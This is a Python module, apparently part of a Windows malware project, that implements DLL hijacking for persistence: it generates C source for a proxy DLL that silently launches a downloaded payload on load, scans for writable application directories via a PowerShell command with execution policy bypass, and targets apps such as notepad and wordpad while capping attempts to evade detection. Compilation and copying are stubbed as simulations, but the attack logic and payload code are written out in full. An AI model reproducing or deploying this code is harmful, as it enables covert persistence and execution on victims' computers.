import os
import shutil
import subprocess
import ctypes
import winreg
import sys
from ctypes import windll, c_buffer, byref, c_ulong

class DLLHijacker:
    """Gère les techniques de DLL Hijacking pour améliorer la persistance."""
    
    def __init__(self, settings):
        """Initialise le gestionnaire de DLL Hijacking."""
        self.settings = settings
        self.vulnerable_paths = [
            os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32'),
            os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'SysWOW64'),
            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Common Files')
        ]
        self.common_dlls = [
            "version.dll",
            "wininet.dll",
            "wintrust.dll",
            "secur32.dll",
            "apphelp.dll",
            "cryptsp.dll"
        ]
        
    def generate_proxy_dll(self, target_dll_name):
        """Génère une DLL proxy qui charge la DLL originale et notre charge utile."""
        # Code C de la DLL proxy
        proxy_c_code = f"""
        #include <windows.h>
        #include <stdio.h>
        
        // Variables globales
        HMODULE originalDLL = NULL;
        char originalPath[MAX_PATH];
        BOOL isLoaded = FALSE;
        
        // Déclaration du point d'entrée de notre DLL malveillante
        BOOL APIENTRY MaliciousEntry() {{
            // Exécuter notre charge utile
            STARTUPINFO si = {{ sizeof(si) }}; 
            PROCESS_INFORMATION pi;
            
            // Exécuter notre binaire principal
            CHAR payloadPath[MAX_PATH];
            sprintf_s(payloadPath, MAX_PATH, "%s", "{os.path.join(self.settings.temp_dir, self.settings.download_filename).replace('\\', '\\\\')}");
            
            // Exécution masquée
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            
            if (CreateProcess(NULL, payloadPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }}
            
            return TRUE;
        }}
        
        // Cette fonction trouve le chemin original de la DLL et la charge
        BOOL LoadOriginalDLL() {{
            char systemPath[MAX_PATH];
            
            // Obtenir le chemin system32
            GetSystemDirectoryA(systemPath, sizeof(systemPath));
            sprintf_s(originalPath, MAX_PATH, "%s\\\\{target_dll_name}", systemPath);
            
            // Charger la DLL originale
            originalDLL = LoadLibraryA(originalPath);
            return (originalDLL != NULL);
        }}
        
        // Point d'entrée de la DLL
        BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
            switch (fdwReason) {{
                case DLL_PROCESS_ATTACH:
                    // Lancer notre code malveillant
                    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MaliciousEntry, NULL, 0, NULL);
                    
                    // Charger la DLL originale
                    if (!isLoaded) {{
                        isLoaded = LoadOriginalDLL();
                    }}
                    break;
            }}
            return TRUE;
        }}
        
        // Export des fonctions de la DLL originale (quelques exemples génériques)
        #define EXPORT_FUNC(name) __declspec(dllexport) FARPROC name() {{ \\
            if (!isLoaded) isLoaded = LoadOriginalDLL(); \\
            return GetProcAddress(originalDLL, #name); \\
        }}
        
        // Exporter quelques fonctions génériques pour compatibilité
        EXPORT_FUNC(DllCanUnloadNow)
        EXPORT_FUNC(DllGetClassObject)
        EXPORT_FUNC(DllRegisterServer)
        EXPORT_FUNC(DllUnregisterServer)
        """
        
        # Créer un fichier temporaire pour le code C
        temp_c_file = os.path.join(self.settings.temp_dir, f"{target_dll_name.split('.')[0]}.c")
        with open(temp_c_file, 'w') as f:
            f.write(proxy_c_code)
        
        # Cette fonction simulerait la compilation de la DLL
        # En pratique, vous auriez besoin d'un compilateur C/C++ ici
        print(f"[i] Génération d'une DLL proxy pour {target_dll_name} (simulation)")
        return temp_c_file
        
    def find_vulnerable_processes(self):
        """Analyse les processus pour trouver des vulnérabilités DLL Search Order."""
        vulnerable_targets = []
        
        try:
            # PowerShell pour obtenir la liste des processus et leurs chemins
            ps_cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "'
            ps_cmd += '$processes = Get-Process | Where-Object {$_.Path -ne $null}; '
            ps_cmd += '$processes | ForEach-Object { $_.Path + \"|\" + $_.Id }'
            ps_cmd += '"'
            
            result = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
            process_list = result.stdout.strip().split('\n')
            
            for process_info in process_list:
                if not process_info.strip():
                    continue
                    
                try:
                    process_path, pid = process_info.split('|')
                    process_dir = os.path.dirname(process_path)
                    
                    # Vérifier si le répertoire du processus est accessible en écriture
                    if os.access(process_dir, os.W_OK):
                        vulnerable_targets.append((process_path, process_dir, pid))
                except Exception:
                    continue
                    
            return vulnerable_targets
        except Exception as e:
            print(f"[-] Erreur lors de la recherche de processus vulnérables: {e}")
            return []
            
    def implement_dll_hijacking(self):
        """Implémente la technique de DLL Hijacking sur les applications vulnérables."""
        print("[+] Recherche de cibles potentielles pour DLL Hijacking...")
        
        vulnerable_targets = self.find_vulnerable_processes()
        hijacked_count = 0
        
        # Tenter le DLL hijacking sur quelques applications fréquemment utilisées
        common_apps = [
            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), "Internet Explorer", "iexplore.exe"),
            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), "Windows NT", "Accessories", "wordpad.exe"),
            os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), "notepad.exe")
        ]
        
        for app_path in common_apps:
            if os.path.exists(app_path):
                app_dir = os.path.dirname(app_path)
                
                # Vérifier que le répertoire est accessible en écriture
                if not os.access(app_dir, os.W_OK):
                    print(f"[-] Répertoire {app_dir} non accessible en écriture, ignoré")
                    continue
                    
                for dll_name in self.common_dlls:
                    target_path = os.path.join(app_dir, dll_name)
                    
                    if not os.path.exists(target_path):
                        try:
                            # Dans un cas réel, nous compilons la DLL proxy ici
                            source_path = self.generate_proxy_dll(dll_name)
                            
                            # Simuler la copie (en pratique, il faudrait déposer la DLL compilée)
                            print(f"[+] DLL Hijacking implémenté pour {app_path} via {dll_name}")
                            hijacked_count += 1
                            
                            if hijacked_count >= 2:  # Limiter le nombre pour éviter la détection
                                break
                        except Exception as e:
                            print(f"[-] Échec du DLL Hijacking pour {app_path}: {e}")
                
                if hijacked_count >= 2:
                    break
        
        return hijacked_count > 0